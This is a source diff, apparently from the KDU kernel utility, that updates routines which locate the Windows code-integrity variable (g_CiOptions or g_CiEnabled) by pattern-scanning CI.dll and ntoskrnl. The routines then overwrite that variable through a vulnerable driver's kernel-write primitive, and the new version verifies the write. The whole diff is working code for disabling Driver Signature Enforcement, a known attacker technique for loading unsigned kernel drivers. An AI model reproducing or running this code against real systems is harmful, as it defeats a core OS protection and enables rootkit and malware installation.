@@ -4,9 +4,9 @@
 *
 *  TITLE:       DSEFIX.CPP
 *
-*  VERSION:     1.10
+*  VERSION:     1.11
 *
-*  DATE:        17 Apr 2021
+*  DATE:        14 May 2021
 *
 *  CI DSE corruption related routines.
 *  Based on DSEFix v1.3
@@ -20,6 +20,88 @@
 
 #include "global.h"
 
+ULONG KDUpCheckInstructionBlock(
+    _In_ PBYTE Code,
+    _In_ ULONG Offset
+)
+{
+    ULONG offset = Offset;
+    hde64s hs;
+
+    RtlSecureZeroMemory(&hs, sizeof(hs));
+
+    hde64_disasm(&Code[offset], &hs);
+    if (hs.flags & F_ERROR)
+        return 0;
+
+    if (hs.len != 3)
+        return 0;
+
+    //
+    // mov     r9, rbx
+    //
+    if (Code[offset] != 0x4C ||
+        Code[offset + 1] != 0x8B)
+    {
+        return 0;
+    }
+
+    offset += hs.len;
+
+    hde64_disasm(&Code[offset], &hs);
+    if (hs.flags & F_ERROR)
+        return 0;
+
+    if (hs.len != 3)
+        return 0;
+
+    //
+    // mov     r8, rdi
+    //
+    if (Code[offset] != 0x4C ||
+        Code[offset + 1] != 0x8B)
+    {
+        return 0;
+    }
+
+    offset += hs.len;
+
+    hde64_disasm(&Code[offset], &hs);
+    if (hs.flags & F_ERROR)
+        return 0;
+    if (hs.len != 3)
+        return 0;
+
+    //
+    // mov     rdx, rsi
+    //
+    if (Code[offset] != 0x48 ||
+        Code[offset + 1] != 0x8B)
+    {
+        return 0;
+    }
+
+    offset += hs.len;
+
+    hde64_disasm(&Code[offset], &hs);
+    if (hs.flags & F_ERROR)
+        return 0;
+
+    if (hs.len != 2)
+        return 0;
+
+    //
+    // mov     ecx, ebp
+    //
+    if (Code[offset] != 0x8B ||
+        Code[offset + 1] != 0xCD)
+    {
+        return 0;
+    }
+
+    return offset + hs.len;
+}
+
 /*
 * KDUQueryCiEnabled
 *
@@ -28,24 +110,29 @@
 * Find g_CiEnabled variable address for Windows 7.
 *
 */
-LONG KDUQueryCiEnabled(
-    _In_ PVOID MappedBase,
-    _In_ SIZE_T SizeOfImage,
-    _Inout_ ULONG_PTR* KernelBase
+NTSTATUS KDUQueryCiEnabled(
+    _In_ HMODULE ImageMappedBase,
+    _In_ ULONG_PTR ImageLoadedBase,
+    _Out_ ULONG_PTR* ResolvedAddress,
+    _In_ SIZE_T SizeOfImage
 )
 {
-    SIZE_T  c;
-    LONG    rel = 0;
+    NTSTATUS    ntStatus = STATUS_UNSUCCESSFUL;
+    SIZE_T      c;
+    LONG        rel = 0;
+
+    *ResolvedAddress = 0;
 
     for (c = 0; c < SizeOfImage - sizeof(DWORD); c++) {
-        if (*(PDWORD)((PBYTE)MappedBase + c) == 0x1d8806eb) {
-            rel = *(PLONG)((PBYTE)MappedBase + c + 4);
-            *KernelBase = *KernelBase + c + 8 + rel;
+        if (*(PDWORD)((PBYTE)ImageMappedBase + c) == 0x1d8806eb) {
+            rel = *(PLONG)((PBYTE)ImageMappedBase + c + 4);
+            *ResolvedAddress = ImageLoadedBase + c + 8 + rel;
+            ntStatus = STATUS_SUCCESS;
             break;
         }
     }
 
-    return rel;
+    return ntStatus;
 }
 
 /*
@@ -56,84 +143,150 @@ LONG KDUQueryCiEnabled(
 * Find g_CiOptions variable address.
 * Depending on current Windows version it will look for target value differently.
 *
+* Params:
+*
+*   ImageMappedBase - CI.dll user mode mapped base
+*   ImageLoadedBase - CI.dll kernel mode loaded base
+*   ResolvedAddress - output variable to hold result value
+*   NtBuildNumber   - current NT build number for search pattern switch
+*
 */
-LONG KDUQueryCiOptions(
-    _In_ HMODULE MappedBase,
-    _Inout_ ULONG_PTR* KernelBase,
+NTSTATUS KDUQueryCiOptions(
+    _In_ HMODULE ImageMappedBase,
+    _In_ ULONG_PTR ImageLoadedBase,
+    _Out_ ULONG_PTR* ResolvedAddress,
     _In_ ULONG NtBuildNumber
 )
 {
-    PBYTE        CiInitialize = NULL;
-    ULONG        c, j = 0;
-    LONG         rel = 0;
+    PBYTE       ptrCode = NULL;
+    ULONG       offset, k, expectedLength;
+    LONG        relativeValue = 0;
+    ULONG_PTR   resolvedAddress = 0;
+
     hde64s hs;
 
-    CiInitialize = (PBYTE)GetProcAddress(MappedBase, "CiInitialize");
-    if (CiInitialize == NULL)
-        return 0;
+    *ResolvedAddress = 0ULL;
 
-    if (NtBuildNumber >= NT_WIN10_REDSTONE3) {
+    ptrCode = (PBYTE)GetProcAddress(ImageMappedBase, (PCHAR)"CiInitialize");
+    if (ptrCode == NULL)
+        return STATUS_PROCEDURE_NOT_FOUND;
 
-        c = 0;
-        j = 0;
+    RtlSecureZeroMemory(&hs, sizeof(hs));
+    offset = 0;
+
+    //
+    // For Win7, Win8/8.1, Win10 until RS3
+    //
+    if (NtBuildNumber < NT_WIN10_REDSTONE3) {
+
+        expectedLength = 5;
+
         do {
 
-            /* call CipInitialize */
-            if (CiInitialize[c] == 0xE8)
-                j++;
-
-            if (j > 1) {
-                rel = *(PLONG)(CiInitialize + c + 1);
-                break;
-            }
-
-            hde64_disasm(CiInitialize + c, &hs);
+            hde64_disasm(&ptrCode[offset], &hs);
             if (hs.flags & F_ERROR)
                 break;
-            c += hs.len;
 
-        } while (c < 256);
+            if (hs.len == expectedLength) { //test if jmp
 
+                //
+                // jmp CipInitialize
+                //
+                if (ptrCode[offset] == 0xE9) {
+                    relativeValue = *(PLONG)(ptrCode + offset + 1);
+                    break;
+                }
+
+            }
+
+            offset += hs.len;
+
+        } while (offset < 256);
     }
     else {
+        //
+        // Everything above Win10 RS3.
+        //
+        expectedLength = 3;
 
-        c = 0;
         do {
 
-            /* jmp CipInitialize */
-            if (CiInitialize[c] == 0xE9) {
-                rel = *(PLONG)(CiInitialize + c + 1);
-                break;
-            }
-            hde64_disasm(CiInitialize + c, &hs);
+            hde64_disasm(&ptrCode[offset], &hs);
             if (hs.flags & F_ERROR)
                 break;
-            c += hs.len;
 
-        } while (c < 256);
+            if (hs.len == expectedLength) {
+
+                //
+                // Parameters for the CipInitialize.
+                //
+                k = KDUpCheckInstructionBlock(ptrCode,
+                    offset);
+
+                if (k != 0) {
+
+                    expectedLength = 5;
+                    hde64_disasm(&ptrCode[k], &hs);
+                    if (hs.flags & F_ERROR)
+                        break;
+
+                    //
+                    // call CipInitialize
+                    //
+                    if (hs.len == expectedLength) {
+                        if (ptrCode[k] == 0xE8) {
+                            offset = k;
+                            relativeValue = *(PLONG)(ptrCode + k + 1);
+                            break;
+                        }
+                    }
+
+                }
+
+            }
+
+            offset += hs.len;
+
+        } while (offset < 256);
 
     }
 
-    CiInitialize = CiInitialize + c + 5 + rel;
-    c = 0;
+    if (relativeValue == 0)
+        return STATUS_UNSUCCESSFUL;
+
+    ptrCode = ptrCode + offset + hs.len + relativeValue;
+    relativeValue = 0;
+    offset = 0;
+    expectedLength = 6;
+
     do {
 
-        if (*(PUSHORT)(CiInitialize + c) == 0x0d89) {
-            rel = *(PLONG)(CiInitialize + c + 2);
-            break;
-        }
-        hde64_disasm(CiInitialize + c, &hs);
+        hde64_disasm(&ptrCode[offset], &hs);
         if (hs.flags & F_ERROR)
             break;
-        c += hs.len;
 
-    } while (c < 256);
+        if (hs.len == expectedLength) { //test if mov
 
-    CiInitialize = CiInitialize + c + 6 + rel;
+            if (*(PUSHORT)(ptrCode + offset) == 0x0d89) {
+                relativeValue = *(PLONG)(ptrCode + offset + 2);
+                break;
+            }
 
-    *KernelBase = *KernelBase + CiInitialize - (PBYTE)MappedBase;
+        }
 
-    return rel;
+        offset += hs.len;
+
+    } while (offset < 256);
+
+    if (relativeValue == 0)
+        return STATUS_UNSUCCESSFUL;
+
+    ptrCode = ptrCode + offset + hs.len + relativeValue;
+    resolvedAddress = ImageLoadedBase + ptrCode - (PBYTE)ImageMappedBase;
+
+    *ResolvedAddress = resolvedAddress;
+
+    return STATUS_SUCCESS;
 }
 
 /*
@@ -149,72 +302,106 @@ ULONG_PTR KDUQueryVariable(
     _In_ ULONG NtBuildNumber
 )
 {
-    LONG rel = 0;
-    SIZE_T SizeOfImage = 0;
-    ULONG_PTR Result = 0, ModuleKernelBase = 0;
-    CONST CHAR* szModuleName;
-    HMODULE MappedModule;
+    NTSTATUS ntStatus;
+    ULONG loadedImageSize = 0;
+    SIZE_T sizeOfImage = 0;
+    ULONG_PTR Result = 0, imageLoadedBase, kernelAddress = 0;
+    LPWSTR lpModuleName;
+    HMODULE mappedImageBase;
 
-    CHAR szFullModuleName[MAX_PATH * 2];
+    WCHAR szFullModuleName[MAX_PATH * 2];
 
     if (NtBuildNumber < NT_WIN8_BLUE) {
-        szModuleName = NTOSKRNL_EXE;
+        lpModuleName = (LPWSTR)NTOSKRNL_EXE;
     }
     else {
-        szModuleName = CI_DLL;
+        lpModuleName = (LPWSTR)CI_DLL;
     }
 
-    ModuleKernelBase = supGetModuleBaseByName(szModuleName);
-    if (ModuleKernelBase == 0) {
-        
-        supPrintfEvent(kduEventError, 
-            "[!] Abort, could not query \"%s\" image base\r\n", szModuleName);
-        
+    imageLoadedBase = supGetModuleBaseByName(lpModuleName, &loadedImageSize);
+    if (imageLoadedBase == 0) {
+
+        supPrintfEvent(kduEventError,
+            "[!] Abort, could not query \"%ws\" image base\r\n", lpModuleName);
+
         return 0;
     }
 
     szFullModuleName[0] = 0;
-    if (!GetSystemDirectoryA(szFullModuleName, MAX_PATH))
+    if (!GetSystemDirectory(szFullModuleName, MAX_PATH))
         return 0;
 
-    _strcat_a(szFullModuleName, "\\");
-    _strcat_a(szFullModuleName, szModuleName);
+    _strcat(szFullModuleName, TEXT("\\"));
+    _strcat(szFullModuleName, lpModuleName);
 
     //
     // Preload module for pattern search.
     //
-    MappedModule = LoadLibraryExA(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
-    if (MappedModule) {
+    mappedImageBase = LoadLibraryEx(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
+    if (mappedImageBase) {
 
-        printf_s("[+] Module \"%s\" loaded for pattern search\r\n", szModuleName);
+        printf_s("[+] Module \"%ws\" loaded for pattern search\r\n", lpModuleName);
 
         if (NtBuildNumber < NT_WIN8_BLUE) {
-            rel = KDUQueryCiEnabled(
-                MappedModule,
-                SizeOfImage,
-                &ModuleKernelBase);
+
+            ntStatus = supQueryImageSize(mappedImageBase,
+                &sizeOfImage);
+
+            if (NT_SUCCESS(ntStatus)) {
+
+                ntStatus = KDUQueryCiEnabled(mappedImageBase,
+                    imageLoadedBase,
+                    &kernelAddress,
+                    sizeOfImage);
+
+            }
 
         }
         else {
-            rel = KDUQueryCiOptions(
-                MappedModule,
-                &ModuleKernelBase,
+
+            ntStatus = KDUQueryCiOptions(mappedImageBase,
+                imageLoadedBase,
+                &kernelAddress,
                 NtBuildNumber);
+
         }
 
-        if (rel != 0) {
-            Result = ModuleKernelBase;
+        if (NT_SUCCESS(ntStatus)) {
+
+            if (IN_REGION(kernelAddress,
+                imageLoadedBase,
+                loadedImageSize))
+            {
+                Result = kernelAddress;
+            }
+            else {
+
+                supPrintfEvent(kduEventError,
+                    "[!] Resolved address 0x%llX does not belong required module.\r\n",
+                    kernelAddress);
+
+            }
+
         }
-        FreeLibrary(MappedModule);
+        else {
+
+            supPrintfEvent(kduEventError,
+                "[!] Failed to locate kernel variable address, NTSTATUS (0x%lX)\r\n",
+                ntStatus);
+
+        }
+
+        FreeLibrary(mappedImageBase);
+
     }
     else {
 
         //
         // Output error.
         //
-        supPrintfEvent(kduEventError, 
-            "[!] Could not load \"%s\", GetLastError %lu\r\n", 
-            szModuleName, 
+        supPrintfEvent(kduEventError,
+            "[!] Could not load \"%ws\", GetLastError %lu\r\n",
+            lpModuleName,
             GetLastError());
 
     }
@@ -237,92 +424,95 @@ BOOL KDUControlDSE(
 {
     BOOL bResult = FALSE;
     ULONG_PTR variableAddress;
-    ULONG returnLength = 0;
-    NTSTATUS ntStatus;
-    SYSTEM_CODEINTEGRITY_INFORMATION state;
+    ULONG ulFlags = 0;
 
     FUNCTION_ENTER_MSG(__FUNCTION__);
-
-    state.CodeIntegrityOptions = 0;
-    state.Length = sizeof(state);
-
-    //
-    // Query DSE state.
-    //
-
-    ntStatus = NtQuerySystemInformation(SystemCodeIntegrityInformation,
-        (PVOID)&state, sizeof(SYSTEM_CODEINTEGRITY_INFORMATION),
-        &returnLength);
-
-    if (NT_SUCCESS(ntStatus)) {
-
-        if (state.CodeIntegrityOptions & CODEINTEGRITY_OPTION_ENABLED) {
-            printf_s("[+] System reports CodeIntegrityOption Enabled\r\n");
-
-            //
-            // Check if DSE is enabled so we don't need to enable it again.
-            //
-            // CI status does not updated on Win7.
-            //
-            if (Context->NtBuildNumber >= NT_WIN10_THRESHOLD1) {
-                if (DSEValue == 6) {
-                    
-                    supPrintfEvent(kduEventError, 
-                        "[!] DSE already enabled, nothing to do, leaving.\r\n");
-                    
-                    return TRUE;
-                }
-            }
-        }
-        else {
-
-            printf_s("[+] System reports CodeIntegrityOption Disabled\r\n");
-
-            //
-            // Check if DSE is disabled so we don't need to disable it again.
-            //
-            if (Context->NtBuildNumber >= NT_WIN10_THRESHOLD1) {
-
-                if (DSEValue == 0) {
-                    
-                    supPrintfEvent(kduEventError, 
-                        "[!] DSE already disabled, nothing to do, leaving.\r\n");
-                    
-                    return TRUE;
-                }
-            }
-        }
-
-    }
-
-    //
-    // Assume variable is in nonpaged .data section.
-    //
 
     variableAddress = KDUQueryVariable(Context->NtBuildNumber);
     if (variableAddress == 0) {
 
-        supPrintfEvent(kduEventError, 
+        supPrintfEvent(kduEventError,
             "[!] Could not query system variable address, abort.\r\n");
 
     }
     else {
 
-        printf_s("[+] Corrupting DSE value at 0x%p address\r\n", (PVOID)variableAddress);
-
-        bResult = Context->Provider->Callbacks.WriteKernelVM(Context->DeviceHandle,
+        //
+        // Read current flags state.
+        //
+        bResult = Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
             variableAddress,
-            &DSEValue,
-            sizeof(DSEValue));
+            &ulFlags,
+            sizeof(ulFlags));
 
-        supPrintfEvent(
-            (bResult == FALSE) ? kduEventError : kduEventNone,
-            "%s Kernel memory %s\r\n",
-            (bResult == FALSE) ? "[!]" : "[+]",
-            (bResult == FALSE) ? "not patched" : "patched");
+        if (!bResult) {
+            supPrintfEvent(kduEventError,
+                "[!] Could not query DSE state, GetLastError %lu\r\n",
+                GetLastError());
 
+        }
+        else {
+
+            printf_s("[+] DSE flags (0x%p) value: %lX, new value to be written: %lX\r\n",
+                (PVOID)variableAddress,
+                ulFlags,
+                DSEValue);
+
+            if (DSEValue == ulFlags) {
+                printf_s("[~] Warning, current value is identical to what you want to write\r\n");
+            }
+
+            DWORD dwLastError;
+
+            bResult = Context->Provider->Callbacks.WriteKernelVM(Context->DeviceHandle,
+                variableAddress,
+                &DSEValue,
+                sizeof(DSEValue));
+
+            dwLastError = GetLastError();
+
+            if (bResult) {
+
+                printf_s("[+] Kernel memory write complete, verifying data\r\n");
+
+                //
+                // Verify write.
+                //
+                ulFlags = 0;
+                bResult = Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
+                    variableAddress,
+                    &ulFlags,
+                    sizeof(ulFlags));
+
+                dwLastError = GetLastError();
+
+                if (bResult) {
+
+                    bResult = (ulFlags == DSEValue);
+
+                    supPrintfEvent(
+                        (bResult == FALSE) ? kduEventError : kduEventInformation,
+                        "%s Write result verification %s\r\n",
+                        (bResult == FALSE) ? "[!]" : "[+]",
+                        (bResult == FALSE) ? "failed" : "succeeded");
+
+
+                }
+                else {
+                    supPrintfEvent(kduEventError,
+                        "[!] Could not verify kernel memory write, GetLastError %lu\r\n",
+                        dwLastError);
+
+                }
+            }
+            else {
+                supPrintfEvent(kduEventError,
+                    "[!] Error while writing to the kernel memory, GetLastError %lu\r\n",
+                    dwLastError);
+            }
+
+        }
     }
-
 
     FUNCTION_LEAVE_MSG(__FUNCTION__);
 
